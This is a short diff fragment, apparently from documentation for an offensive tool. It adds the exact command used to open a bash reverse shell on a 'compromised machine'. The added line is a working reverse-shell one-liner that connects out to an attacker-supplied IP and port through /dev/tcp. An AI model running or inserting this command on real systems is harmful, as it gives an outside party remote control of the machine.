@@ -21,5 +21,7 @@ This allows you to run a reverse shell with bash inside the compromised machine.
 
 the command that is executed is:
 
+"bash -i >& /dev/tcp/$ip/$port 0>&1"
+
 
 
